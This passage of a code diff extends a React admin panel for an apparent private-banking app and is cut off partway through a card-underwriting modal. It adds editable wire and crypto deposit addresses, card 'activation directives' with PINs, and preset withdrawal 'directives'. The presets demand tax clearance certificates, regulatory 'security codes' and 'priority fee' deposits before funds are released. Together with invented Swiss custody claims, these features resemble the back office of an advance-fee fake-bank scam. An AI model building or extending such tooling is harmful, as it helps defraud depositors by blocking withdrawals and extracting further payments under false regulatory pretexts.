@@ -1,10 +1,13 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Link } from "react-router";
 import {
+  Building2,
   Check,
   ChevronRight,
   Clock,
+  CreditCard,
   Download,
+  Landmark,
   Loader2,
   LogOut,
   PlusCircle,
@@ -14,6 +17,7 @@ import {
   Snowflake,
   Sun,
   UserPlus,
+  Wallet,
   X,
   Zap,
 } from "lucide-react";
@@ -50,7 +54,7 @@ import {
 import { cn } from "@/lib/utils";
 import { formatDateTime, formatMoney } from "@/lib/money";
 
-type Tab = "overview" | "clients" | "deposits" | "payments" | "withdrawals" | "approvals" | "logs";
+type Tab = "overview" | "clients" | "cards" | "deposits" | "payments" | "withdrawals" | "approvals" | "logs" | "deposit_coords";
 
 const PRESET_AMOUNTS = [1000, 5000, 25000, 50000, 100000, 500000, 1000000];
 
@@ -60,6 +64,7 @@ export default function Admin() {
     redirectPath: LOGIN_PATH,
   });
   const utils = trpc.useUtils();
+  const isAdmin = !!user && user.role === "admin";
   const [tab, setTab] = useState<Tab>("overview");
   const [selectedUserId, setSelectedUserId] = useState<number | null>(null);
   const [notice, setNotice] = useState<string | null>(null);
@@ -76,6 +81,26 @@ export default function Admin() {
 
   // Create Client Modal State
   const [createClientOpen, setCreateClientOpen] = useState(false);
+
+  // Card Underwriting Modal State
+  const [cardUnderwriteModal, setCardUnderwriteModal] = useState<{
+    open: boolean;
+    card?: any;
+    decision: "approve_with_instruction" | "instant_activate" | "reject";
+    instruction: string;
+    pin: string;
+    limit: number;
+    note: string;
+  }>({
+    open: false,
+    decision: "approve_with_instruction",
+    instruction: "Dual-signatory executive authorization required. Enter Signatory PIN 8821 on your client dashboard to initialize card EMV chip.",
+    pin: "8821",
+    limit: 100000,
+    note: "Underwritten under Swiss Private Banking Collateral Framework",
+  });
+  const [cardFilterStatus, setCardFilterStatus] = useState<"all" | "pending_approval" | "pending_activation" | "active" | "frozen">("all");
+  const [cardSearch, setCardSearch] = useState("");
 
   // Clearance Schedule & Expedite Modal State
   const [scheduleModal, setScheduleModal] = useState<{
@@ -104,6 +129,41 @@ export default function Admin() {
   const [customTxAdminNote, setCustomTxAdminNote] = useState("");
   const [customTxExpedite, setCustomTxExpedite] = useState<number | undefined>(undefined);
 
+  // Deposit Coordinates & Inbound Settings State
+  const depositSettingsQuery = trpc.admin.getDepositSettings.useQuery(undefined, { enabled: isAdmin });
+  const [wireBankName, setWireBankName] = useState("Summit Private Bank AG");
+  const [wireSwift, setWireSwift] = useState("SUMMUS33XXX");
+  const [wireRouting, setWireRouting] = useState("021000021");
+  const [wireAddress, setWireAddress] = useState("Bahnhofstrasse 45, 8001 Zurich, Switzerland");
+  const [wireBeneficiary, setWireBeneficiary] = useState("Summit Institutional Custody Desk");
+  const [wireInstructions, setWireInstructions] = useState("Include your unique account number and reference in the wire narrative / memo line for auto-routing.");
+  const [cryptoUsdt, setCryptoUsdt] = useState("0x742d35Cc6634C0532925a3b844Bc454e4438f44e");
+  const [cryptoBtc, setCryptoBtc] = useState("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh");
+  const [cryptoEth, setCryptoEth] = useState("0x742d35Cc6634C0532925a3b844Bc454e4438f44e");
+  const [cryptoUsdc, setCryptoUsdc] = useState("0x742d35Cc6634C0532925a3b844Bc454e4438f44e");
+  const [directInstructions, setDirectInstructions] = useState("Submit your deposit declaration below. Treasury will credit and settle funds once physical or wire verification is authenticated.");
+  const [depositNoticeText, setDepositNoticeText] = useState("All client inbound capital is maintained in segregated Swiss Tier-1 custody vaults.");
+  const [depositCoordsInitialized, setDepositCoordsInitialized] = useState(false);
+
+  useEffect(() => {
+    if (depositSettingsQuery.data && !depositCoordsInitialized) {
+      const d = depositSettingsQuery.data;
+      setWireBankName(d.bankName || "");
+      setWireSwift(d.swiftBic || "");
+      setWireRouting(d.routingNumber || "");
+      setWireAddress(d.bankAddress || "");
+      setWireBeneficiary(d.beneficiaryName || "");
+      setWireInstructions(d.wireInstructions || "");
+      setCryptoUsdt(d.usdtAddress || "");
+      setCryptoBtc(d.btcAddress || "");
+      setCryptoEth(d.ethAddress || "");
+      setCryptoUsdc(d.usdcAddress || "");
+      setDirectInstructions(d.directCreditInstructions || "");
+      setDepositNoticeText(d.depositNotice || "");
+      setDepositCoordsInitialized(true);
+    }
+  }, [depositSettingsQuery.data, depositCoordsInitialized]);
+
   // Search & Filter States
   const [depositSearch, setDepositSearch] = useState("");
   const [depositStatus, setDepositStatus] = useState<"all" | "pending" | "approved" | "rejected">("all");
@@ -111,8 +171,6 @@ export default function Admin() {
   const [withdrawalSearch, setWithdrawalSearch] = useState("");
   const [withdrawalStatus, setWithdrawalStatus] = useState<"all" | "pending" | "approved" | "rejected">("all");
   const [clientSearch, setClientSearch] = useState("");
-
-  const isAdmin = !!user && user.role === "admin";
 
   const overview = trpc.admin.overview.useQuery(undefined, { enabled: isAdmin });
   const users = trpc.admin.listUsers.useQuery(undefined, { enabled: isAdmin });
@@ -133,12 +191,14 @@ export default function Admin() {
     { enabled: isAdmin && tab === "withdrawals" },
   );
   const logs = trpc.admin.activityLogs.useQuery(undefined, { enabled: isAdmin && tab === "logs" });
+  const allCards = trpc.admin.listCards.useQuery(undefined, { enabled: isAdmin && (tab === "cards" || tab === "overview" || tab === "approvals") });
 
   const invalidateAll = async () => {
     await Promise.all([
       utils.admin.overview.invalidate(),
       utils.admin.listUsers.invalidate(),
       utils.admin.listTransactions.invalidate(),
+      utils.admin.listCards.invalidate(),
       utils.admin.depositHistory.invalidate(),
       utils.admin.paymentHistory.invalidate(),
       utils.admin.withdrawalHistory.invalidate(),
@@ -146,6 +206,7 @@ export default function Admin() {
       utils.admin.activityLogs.invalidate(),
       utils.bank.account.invalidate(),
       utils.bank.transactions.invalidate(),
+      utils.bank.cards.invalidate(),
     ]);
   };
 
@@ -189,11 +250,31 @@ export default function Admin() {
     onError: (e) => flash(e.message),
   });
 
+  const underwriteCardMutation = trpc.admin.underwriteCard.useMutation({
+    onSuccess: async (card) => {
+      setCardUnderwriteModal((prev) => ({ ...prev, open: false }));
+      flash(`Card #${card.cardNumber.slice(-4)} (${card.tier}) underwritten: ${card.status.toUpperCase()}`);
+      await invalidateAll();
+    },
+    onError: (e) => flash(e.message),
+  });
+
   const addCustomTxMutation = trpc.admin.addCustomTransaction.useMutation({
     onSuccess: async (res) => {
       setCustomTxOpen(false);
       flash(`Transaction recorded! Ref: ${res.transaction.reference}`);
       await invalidateAll();
+    },
+    onError: (e) => flash(e.message),
+  });
+
+  const updateDepositSettingsMutation = trpc.admin.updateDepositSettings.useMutation({
+    onSuccess: async () => {
+      flash("Client deposit coordinates updated successfully across all accounts.");
+      await Promise.all([
+        utils.admin.getDepositSettings.invalidate(),
+        utils.bank.depositSettings.invalidate(),
+      ]);
     },
     onError: (e) => flash(e.message),
   });
@@ -372,7 +453,16 @@ export default function Admin() {
             [
               ["overview", "Overview"],
               ["clients", `Clients (${clientUsers.length})`],
+              [
+                "cards",
+                `Card Underwriting${
+                  (allCards.data ?? []).filter((c) => c.status === "pending_approval" || c.status === "pending_activation").length > 0
+                    ? ` (${(allCards.data ?? []).filter((c) => c.status === "pending_approval" || c.status === "pending_activation").length})`
+                    : ""
+                }`,
+              ],
               ["deposits", "Deposit History"],
+              ["deposit_coords", "Client Deposit Details"],
               ["payments", "Payment History"],
               ["withdrawals", "Withdrawal History"],
               ["approvals", `Review Queue${approvals.data?.length ? ` (${approvals.data.length})` : ""}`],
@@ -1182,6 +1272,396 @@ export default function Admin() {
             </div>
           </div>
         )}
+
+        {/* ===================== TAB: CLIENT DEPOSIT DETAILS & SETTINGS ===================== */}
+        {tab === "deposit_coords" && (
+          <div className="mt-8 space-y-8">
+            <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border pb-6">
+              <div>
+                <h3 className="font-display text-xl uppercase tracking-[0.05em] text-foreground flex items-center gap-2">
+                  <Landmark className="h-5 w-5 text-gold" />
+                  Client Inbound Deposit Coordinates & Protocols
+                </h3>
+                <p className="mt-1 text-xs text-muted-foreground">
+                  Configure corporate wire instructions, institutional crypto custody addresses, and clearance disclosures shown to all private banking clients.
+                </p>
+              </div>
+              <Button
+                disabled={updateDepositSettingsMutation.isPending}
+                onClick={() => {
+                  updateDepositSettingsMutation.mutate({
+                    bankName: wireBankName,
+                    swiftBic: wireSwift,
+                    routingNumber: wireRouting,
+                    bankAddress: wireAddress,
+                    beneficiaryName: wireBeneficiary,
+                    wireInstructions: wireInstructions,
+                    usdtAddress: cryptoUsdt,
+                    btcAddress: cryptoBtc,
+                    ethAddress: cryptoEth,
+                    usdcAddress: cryptoUsdc,
+                    directCreditInstructions: directInstructions,
+                    depositNotice: depositNoticeText,
+                  });
+                }}
+                className="bg-gold text-[12px] font-semibold uppercase tracking-[0.16em] text-navy-deep hover:bg-cream h-11 px-6 shadow-lg shadow-gold/10"
+              >
+                {updateDepositSettingsMutation.isPending && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
+                <Check className="mr-2 h-4 w-4" />
+                Save All Deposit Coordinates
+              </Button>
+            </div>
+
+            <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
+              {/* Wire Coordinates Card */}
+              <div className="border border-border bg-navy-deep p-6 space-y-5">
+                <div className="flex items-center gap-2 pb-3 border-b border-border/60">
+                  <Building2 className="h-4 w-4 text-gold" />
+                  <h4 className="font-display text-sm uppercase tracking-wider text-cream">
+                    Global Wire Clearing Coordinates
+                  </h4>
+                </div>
+
+                <div className="space-y-4">
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground">Corporate Clearing Bank Name</Label>
+                    <Input
+                      value={wireBankName}
+                      onChange={(e) => setWireBankName(e.target.value)}
+                      placeholder="e.g. Summit Private Bank AG"
+                      className="bg-navy-panel border-border text-foreground text-xs h-10 font-mono"
+                    />
+                  </div>
+
+                  <div className="grid grid-cols-2 gap-4">
+                    <div className="space-y-1.5">
+                      <Label className="text-xs uppercase tracking-wider text-muted-foreground">SWIFT / BIC Code</Label>
+                      <Input
+                        value={wireSwift}
+                        onChange={(e) => setWireSwift(e.target.value)}
+                        placeholder="e.g. SUMMUS33XXX"
+                        className="bg-navy-panel border-border text-gold font-bold text-xs h-10 font-mono uppercase"
+                      />
+                    </div>
+                    <div className="space-y-1.5">
+                      <Label className="text-xs uppercase tracking-wider text-muted-foreground">Fedwire / ABA Routing</Label>
+                      <Input
+                        value={wireRouting}
+                        onChange={(e) => setWireRouting(e.target.value)}
+                        placeholder="e.g. 021000021"
+                        className="bg-navy-panel border-border text-foreground font-mono text-xs h-10"
+                      />
+                    </div>
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground">Default Beneficiary Name / Desk</Label>
+                    <Input
+                      value={wireBeneficiary}
+                      onChange={(e) => setWireBeneficiary(e.target.value)}
+                      placeholder="e.g. Summit Institutional Custody Desk"
+                      className="bg-navy-panel border-border text-foreground text-xs h-10 font-mono"
+                    />
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground">Bank Physical Address / Jurisdiction</Label>
+                    <Input
+                      value={wireAddress}
+                      onChange={(e) => setWireAddress(e.target.value)}
+                      placeholder="e.g. Bahnhofstrasse 45, 8001 Zurich, Switzerland"
+                      className="bg-navy-panel border-border text-foreground text-xs h-10 font-mono"
+                    />
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground">Wire Memo & Routing Instructions</Label>
+                    <textarea
+                      value={wireInstructions}
+                      onChange={(e) => setWireInstructions(e.target.value)}
+                      rows={3}
+                      className="w-full rounded border border-border bg-navy-panel px-3 py-2 text-xs text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-gold"
+                      placeholder="Instructions shown to clients in their wire deposit modal..."
+                    />
+                  </div>
+                </div>
+              </div>
+
+              {/* Crypto Custody Card */}
+              <div className="border border-border bg-navy-deep p-6 space-y-5">
+                <div className="flex items-center gap-2 pb-3 border-b border-border/60">
+                  <Wallet className="h-4 w-4 text-gold" />
+                  <h4 className="font-display text-sm uppercase tracking-wider text-cream">
+                    Digital Asset Custody Vault Addresses
+                  </h4>
+                </div>
+
+                <div className="space-y-4">
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground flex items-center justify-between">
+                      <span>Tether USD (USDT — ERC20 / TRC20)</span>
+                      <span className="text-[10px] text-gold font-mono">Instant Clearing</span>
+                    </Label>
+                    <Input
+                      value={cryptoUsdt}
+                      onChange={(e) => setCryptoUsdt(e.target.value)}
+                      placeholder="0x..."
+                      className="bg-navy-panel border-border text-gold font-mono text-xs h-10"
+                    />
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground flex items-center justify-between">
+                      <span>Bitcoin (BTC — Native SegWit / Taproot)</span>
+                      <span className="text-[10px] text-gold font-mono">Cold Vault</span>
+                    </Label>
+                    <Input
+                      value={cryptoBtc}
+                      onChange={(e) => setCryptoBtc(e.target.value)}
+                      placeholder="bc1q..."
+                      className="bg-navy-panel border-border text-gold font-mono text-xs h-10"
+                    />
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground flex items-center justify-between">
+                      <span>Ethereum (ETH — Mainnet Custody)</span>
+                      <span className="text-[10px] text-gold font-mono">Smart Contract</span>
+                    </Label>
+                    <Input
+                      value={cryptoEth}
+                      onChange={(e) => setCryptoEth(e.target.value)}
+                      placeholder="0x..."
+                      className="bg-navy-panel border-border text-gold font-mono text-xs h-10"
+                    />
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground flex items-center justify-between">
+                      <span>USD Coin (USDC — Circle Treasury)</span>
+                      <span className="text-[10px] text-gold font-mono">Regulated Reserve</span>
+                    </Label>
+                    <Input
+                      value={cryptoUsdc}
+                      onChange={(e) => setCryptoUsdc(e.target.value)}
+                      placeholder="0x..."
+                      className="bg-navy-panel border-border text-gold font-mono text-xs h-10"
+                    />
+                  </div>
+
+                  <div className="space-y-1.5 pt-1">
+                    <Label className="text-xs uppercase tracking-wider text-muted-foreground">Client Vault Custody Security Notice</Label>
+                    <textarea
+                      value={depositNoticeText}
+                      onChange={(e) => setDepositNoticeText(e.target.value)}
+                      rows={2}
+                      className="w-full rounded border border-border bg-navy-panel px-3 py-2 text-xs text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-gold"
+                      placeholder="Institutional custody notice banner displayed to depositors..."
+                    />
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Direct Credit & Institutional Protocol */}
+            <div className="border border-border bg-navy-deep p-6 space-y-4">
+              <div className="flex items-center gap-2 pb-3 border-b border-border/60">
+                <ShieldCheck className="h-4 w-4 text-gold" />
+                <h4 className="font-display text-sm uppercase tracking-wider text-cream">
+                  Direct Credit & Regulatory Clearance Protocol
+                </h4>
+              </div>
+              <div className="space-y-1.5">
+                <Label className="text-xs uppercase tracking-wider text-muted-foreground">Client Guidance for Physical / Wire / Crypto Settlement Declarations</Label>
+                <textarea
+                  value={directInstructions}
+                  onChange={(e) => setDirectInstructions(e.target.value)}
+                  rows={2}
+                  className="w-full rounded border border-border bg-navy-panel px-3 py-2 text-xs text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-gold"
+                  placeholder="Instructions explaining deposit confirmation, compliance clearance, and treasury credit..."
+                />
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* ===================== TAB: CARDS UNDERWRITING ===================== */}
+        {tab === "cards" && (
+          <div className="mt-8 space-y-6">
+            <div className="flex flex-wrap items-center justify-between gap-4">
+              <div>
+                <h3 className="font-display text-xl uppercase tracking-wider text-cream flex items-center gap-2">
+                  <CreditCard className="h-5 w-5 text-gold" />
+                  Sovereign Card Underwriting & Directive Desk
+                </h3>
+                <p className="text-xs text-muted-foreground mt-0.5">
+                  Review luxury metal card applications, verify client portfolio history standing, and dispatch EMV activation directives.
+                </p>
+              </div>
+              <div className="flex items-center gap-3">
+                <Input
+                  value={cardSearch}
+                  onChange={(e) => setCardSearch(e.target.value)}
+                  placeholder="Search by client or card ending..."
+                  className="bg-navy-panel text-xs h-9 w-64"
+                />
+                <select
+                  value={cardFilterStatus}
+                  onChange={(e) => setCardFilterStatus(e.target.value as any)}
+                  className="bg-navy-panel border border-border h-9 px-3 text-xs text-foreground"
+                >
+                  <option value="all">All Card Statuses</option>
+                  <option value="pending_approval">Pending Underwriting</option>
+                  <option value="pending_activation">Pending Activation Directive</option>
+                  <option value="active">Active Working Cards</option>
+                  <option value="frozen">Frozen Cards</option>
+                </select>
+              </div>
+            </div>
+
+            {/* Quick Metrics */}
+            <div className="grid grid-cols-1 gap-px border border-border bg-border sm:grid-cols-4">
+              <Stat label="Total Registered Cards" value={String(allCards.data?.length ?? 0)} />
+              <Stat
+                label="Pending Underwriting"
+                value={String((allCards.data ?? []).filter((c) => c.status === "pending_approval").length)}
+                alert={(allCards.data ?? []).some((c) => c.status === "pending_approval")}
+              />
+              <Stat
+                label="Pending Activation"
+                value={String((allCards.data ?? []).filter((c) => c.status === "pending_activation").length)}
+                gold
+              />
+              <Stat
+                label="Active Operational"
+                value={String((allCards.data ?? []).filter((c) => c.status === "active").length)}
+              />
+            </div>
+
+            {/* Card Application List */}
+            <div className="border border-border bg-navy-deep overflow-hidden">
+              <div className="overflow-x-auto">
+                <table className="w-full text-left text-xs">
+                  <thead className="border-b border-border bg-navy-panel text-[10px] uppercase tracking-wider text-muted-foreground">
+                    <tr>
+                      <th className="py-3 px-4">Client / Account</th>
+                      <th className="py-3 px-4">Card Tier & Type</th>
+                      <th className="py-3 px-4">Masked Number</th>
+                      <th className="py-3 px-4">Spending Limit</th>
+                      <th className="py-3 px-4">History Standing Milestone</th>
+                      <th className="py-3 px-4">Status & Directive</th>
+                      <th className="py-3 px-4 text-right">Actions</th>
+                    </tr>
+                  </thead>
+                  <tbody className="divide-y divide-border/60">
+                    {(() => {
+                      let list = allCards.data ?? [];
+                      if (cardFilterStatus !== "all") {
+                        list = list.filter((c) => c.status === cardFilterStatus);
+                      }
+                      if (cardSearch.trim()) {
+                        const q = cardSearch.toLowerCase();
+                        list = list.filter(
+                          (c) =>
+                            c.userName.toLowerCase().includes(q) ||
+                            c.userEmail.toLowerCase().includes(q) ||
+                            c.tier.toLowerCase().includes(q) ||
+                            c.cardNumber.includes(q),
+                        );
+                      }
+                      if (list.length === 0) {
+                        return (
+                          <tr>
+                            <td colSpan={7} className="py-8 text-center text-muted-foreground">
+                              No card records match your filter criteria.
+                            </td>
+                          </tr>
+                        );
+                      }
+                      return list.map((c) => (
+                        <tr key={c.id} className="hover:bg-navy-panel/40 transition-colors">
+                          <td className="py-3.5 px-4 font-mono">
+                            <div className="font-semibold text-cream font-sans">{c.userName}</div>
+                            <div className="text-[10px] text-muted-foreground">{c.userEmail}</div>
+                            <div className="text-[10px] text-gold">Acct #{c.accountNumber} · ${formatMoney(c.accountBalance)}</div>
+                          </td>
+                          <td className="py-3.5 px-4">
+                            <span className="font-semibold text-cream block">{c.tier}</span>
+                            <span className="text-[10px] text-muted-foreground uppercase">{c.type} format</span>
+                          </td>
+                          <td className="py-3.5 px-4 font-mono text-cream font-bold">
+                            {c.cardNumber}
+                          </td>
+                          <td className="py-3.5 px-4 font-mono text-cream">
+                            ${formatMoney(c.spendingLimit)}
+                          </td>
+                          <td className="py-3.5 px-4">
+                            <span className="text-zinc-300 font-mono text-[11px] block">{c.requiredHistoryPosition || "Standard Private Client"}</span>
+                            {c.applicationNote && (
+                              <span className="text-[10px] text-muted-foreground block italic">"{c.applicationNote}"</span>
+                            )}
+                          </td>
+                          <td className="py-3.5 px-4">
+                            <div className="space-y-1">
+                              <span
+                                className={cn(
+                                  "inline-block px-2 py-0.5 text-[9px] uppercase font-bold rounded",
+                                  c.status === "active"
+                                    ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/30"
+                                    : c.status === "pending_approval"
+                                      ? "bg-amber-500/20 text-amber-300 border border-amber-500/30 animate-pulse"
+                                      : c.status === "pending_activation"
+                                        ? "bg-gold/20 text-gold border border-gold/40"
+                                        : "bg-sky-500/20 text-sky-300 border border-sky-500/30",
+                                )}
+                              >
+                                {c.status.replace("_", " ")}
+                              </span>
+                              {c.activationInstruction && (
+                                <div className="text-[10px] text-zinc-300 font-mono truncate max-w-xs" title={c.activationInstruction}>
+                                  Directive: {c.activationInstruction}
+                                </div>
+                              )}
+                              {c.activationPin && (
+                                <div className="text-[10px] text-gold font-mono">
+                                  PIN: {c.activationPin}
+                                </div>
+                              )}
+                            </div>
+                          </td>
+                          <td className="py-3.5 px-4 text-right">
+                            <Button
+                              size="sm"
+                              onClick={() => {
+                                setCardUnderwriteModal({
+                                  open: true,
+                                  card: c,
+                                  decision: c.status === "pending_approval" ? "approve_with_instruction" : "instant_activate",
+                                  instruction: c.activationInstruction || "Dual-signatory executive authorization required. Enter Signatory PIN 8821 on your client dashboard to initialize card EMV chip.",
+                                  pin: c.activationPin || "8821",
+                                  limit: c.spendingLimit,
+                                  note: c.adminDecisionNote || "Approved under Sovereign Collateral Underwriting",
+                                });
+                              }}
+                              className={cn(
+                                "h-8 text-[10px] uppercase font-bold px-3",
+                                c.status === "pending_approval"
+                                  ? "bg-gold text-navy-deep hover:bg-cream"
+                                  : "border border-border text-muted-foreground hover:text-white",
+                              )}
+                            >
+                              {c.status === "pending_approval" ? "Underwrite Application" : "Edit Directives"}
+                            </Button>
+                          </td>
+                        </tr>
+                      ));
+                    })()}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+        )}
       </main>
 
       {/* ===================== MODAL: TOP UP ANY USER ===================== */}
@@ -1433,11 +1913,11 @@ export default function Admin() {
         <DialogContent className="border-border bg-navy-deep text-foreground sm:max-w-lg">
           <DialogHeader>
             <DialogTitle className="font-display text-xl uppercase tracking-[0.06em] text-foreground flex items-center gap-2">
-              <Clock className="h-5 w-5 text-gold" />
-              Clearance Schedule & Expedite Terms
+              <ShieldCheck className="h-5 w-5 text-gold" />
+              Treasury Clearance Directive & Process Instructions
             </DialogTitle>
             <DialogDescription className="text-xs text-muted-foreground">
-              Define the scheduled clearance timestamp for this withdrawal and optionally request a collateral deposit for fast-track release.
+              Define the official instructions, compliance requirements (e.g. Tax Clearance Certificate, Security PIN), and clearance schedule dispatched to this client.
             </DialogDescription>
           </DialogHeader>
 
@@ -1467,8 +1947,42 @@ export default function Admin() {
               )}
             </div>
 
+            {/* Directive Presets for User */}
+            <div className="space-y-1.5 border-t border-border pt-3">
+              <Label className="text-xs uppercase tracking-wider text-muted-foreground flex items-center justify-between">
+                <span>Client Process Directives & Requirements</span>
+                <span className="text-[10px] text-gold font-mono">Dispatched to User Dashboard</span>
+              </Label>
+              <div className="grid grid-cols-2 gap-1.5 mb-2">
+                {[
+                  ["📜 Tax Clearance (ITCC)", "International Tax Clearance Certificate (ITCC) required prior to wire disbursement. Please submit document to compliance@summitbank.com."],
+                  ["🔑 Security PIN Code", "FINMA Regulatory Security Clearance Code required from client authorized signatory."],
+                  ["⚡ Expedited Release", "Expedited Priority Liquidity Window active. Deposit designated priority fee to trigger immediate Fedwire/SWIFT transmission."],
+                  ["📞 Compliance Call", "Direct verification teleconference scheduled with Executive Wealth Officer. Check registered email for conference details."],
+                  ["⚖️ AML / SOW Review", "Anti-Money Laundering (AML) Source of Wealth documentation under routine review. Automated release upon verification."],
+                  ["🏦 Interbank Batch", "Withdrawal approved for release in next Swiss Interbank Clearing batch window."],
+                ].map(([label, directive]) => (
+                  <button
+                    key={label}
+                    type="button"
+                    onClick={() => setScheduleModal((prev) => ({ ...prev, adminNote: directive }))}
+                    className="text-[10px] uppercase font-mono p-1.5 border border-border bg-navy-panel text-muted-foreground hover:text-cream hover:border-gold/60 text-left truncate rounded transition-colors"
+                  >
+                    {label}
+                  </button>
+                ))}
+              </div>
+              <textarea
+                rows={3}
+                placeholder="Type custom instructions for the client regarding how to withdraw or clear this transaction..."
+                value={scheduleModal.adminNote || ""}
+                onChange={(e) => setScheduleModal((prev) => ({ ...prev, adminNote: e.target.value }))}
+                className="w-full rounded border border-border bg-navy-panel px-3 py-2 text-xs text-foreground placeholder:text-muted-foreground font-mono focus:outline-none focus:ring-1 focus:ring-gold"
+              />
+            </div>
+
             {/* Estimated Approval Presets */}
-            <div className="space-y-1.5">
+            <div className="space-y-1.5 border-t border-border pt-3">
               <Label className="text-xs uppercase tracking-wider text-muted-foreground">
                 Scheduled Clearance Time
               </Label>
@@ -1497,7 +2011,7 @@ export default function Admin() {
                 ))}
               </div>
               <Input
-                placeholder="e.g. Oct 06, 2026 at 16:30 CET"
+                placeholder="e.g. Oct 16, 2026 at 16:30 CET"
                 value={scheduleModal.estimatedApproval || ""}
                 onChange={(e) => setScheduleModal((prev) => ({ ...prev, estimatedApproval: e.target.value }))}
                 className="bg-navy-panel text-xs h-10"
@@ -1508,11 +2022,11 @@ export default function Admin() {
             <div className="space-y-1.5 border-t border-border pt-3">
               <div className="flex items-center justify-between">
                 <Label className="text-xs uppercase tracking-wider text-gold font-bold flex items-center gap-1.5">
-                  <span>⚡ Request Collateral Deposit for Faster Release</span>
+                  <span>⚡ Optional Expedite / Priority Verification Deposit</span>
                 </Label>
               </div>
               <p className="text-[11px] text-muted-foreground leading-tight">
-                Request a specific deposit amount from the client to prioritize and clear their withdrawal before the scheduled time.
+                Request a specific deposit amount from the client to prioritize and clear their withdrawal immediately.
               </p>
               <div className="flex gap-2">
                 {[1000, 5000, 10000, 25000].map((amt) => (
@@ -1546,28 +2060,308 @@ export default function Admin() {
               />
             </div>
 
-            {/* Backoffice Memorandum */}
-            <div className="space-y-1.5">
-              <Label className="text-xs uppercase tracking-wider text-muted-foreground">
-                Compliance Note / Audit Reason
-              </Label>
-              <Input
-                placeholder="e.g. Standard Swiss FINMA verification in progress"
-                value={scheduleModal.adminNote || ""}
-                onChange={(e) => setScheduleModal((prev) => ({ ...prev, adminNote: e.target.value }))}
-                className="bg-navy-panel text-xs h-10"
-              />
+            <div className="flex gap-2 pt-3 border-t border-border">
+              <Button
+                type="button"
+                variant="outline"
+                disabled={decide.isPending}
+                onClick={() => {
+                  if (scheduleModal.txId) {
+                    decide.mutate({ transactionId: scheduleModal.txId, approve: false });
+                    setScheduleModal({ open: false });
+                  }
+                }}
+                className="border-red-500/50 text-red-300 hover:bg-red-500/10 text-xs uppercase h-11"
+              >
+                Reject
+              </Button>
+              <Button
+                type="submit"
+                disabled={updateScheduleMutation.isPending}
+                className="flex-1 bg-gold text-navy-deep font-semibold uppercase tracking-wider text-xs h-11"
+              >
+                {updateScheduleMutation.isPending && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
+                Dispatch Directive to Client
+              </Button>
+              <Button
+                type="button"
+                disabled={decide.isPending}
+                onClick={() => {
+                  if (scheduleModal.txId) {
+                    decide.mutate({ transactionId: scheduleModal.txId, approve: true });
+                    setScheduleModal({ open: false });
+                  }
+                }}
+                className="bg-emerald-500/90 text-navy-deep hover:bg-emerald-400 font-semibold text-xs uppercase h-11 px-4"
+              >
+                Approve & Settle
+              </Button>
             </div>
-
-            <Button
-              type="submit"
-              disabled={updateScheduleMutation.isPending}
-              className="w-full bg-gold text-navy-deep font-semibold uppercase tracking-wider text-xs h-11"
-            >
-              {updateScheduleMutation.isPending && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-              Save Clearance & Expedite Terms
-            </Button>
           </form>
+        </DialogContent>
+      </Dialog>
+
+      {/* ===================== MODAL: CARD UNDERWRITING & DIRECTIVES ===================== */}
+      <Dialog
+        open={cardUnderwriteModal.open}
+        onOpenChange={(o) => !o && setCardUnderwriteModal((prev) => ({ ...prev, open: false }))}
+      >
+        <DialogContent className="border-border bg-navy-deep text-foreground max-w-lg max-h-[90vh] overflow-y-auto">
+          <DialogHeader>
+            <DialogTitle className="font-display text-xl uppercase tracking-[0.06em] text-foreground flex items-center gap-2">
+              <CreditCard className="h-5 w-5 text-gold" />
+              Underwrite Luxury Card & Issue Directive
+            </DialogTitle>
+            <DialogDescription className="text-xs text-muted-foreground">
+              Review client portfolio qualification, set spending limits, and assign the specific activation directive required before this card starts working.
+            </DialogDescription>
+          </DialogHeader>
+
+          {cardUnderwriteModal.card && (
+            <div className="space-y-4 pt-2">
+              {/* Client & Card Summary */}
+              <div className="rounded border border-border bg-navy-panel p-3.5 space-y-1.5 text-xs font-mono">
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground uppercase text-[10px]">Client Legal Name:</span>
+                  <span className="text-cream font-bold">{cardUnderwriteModal.card.userName}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground uppercase text-[10px]">Account / Balance:</span>
+                  <span className="text-gold font-bold">
+                    Acct #{cardUnderwriteModal.card.accountNumber} · ${formatMoney(cardUnderwriteModal.card.accountBalance)}
+                  </span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground uppercase text-[10px]">Requested Tier:</span>
+                  <span className="text-cream font-bold">{cardUnderwriteModal.card.tier} ({cardUnderwriteModal.card.type})</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground uppercase text-[10px]">History Standing:</span>
+                  <span className="text-emerald-400 font-bold">{cardUnderwriteModal.card.requiredHistoryPosition || "Standard Private Wealth"}</span>
+                </div>
+              </div>
+
+              {/* Decision Type */}
+              <div className="space-y-1.5">
+                <Label className="text-xs uppercase text-muted-foreground">Underwriting Decision</Label>
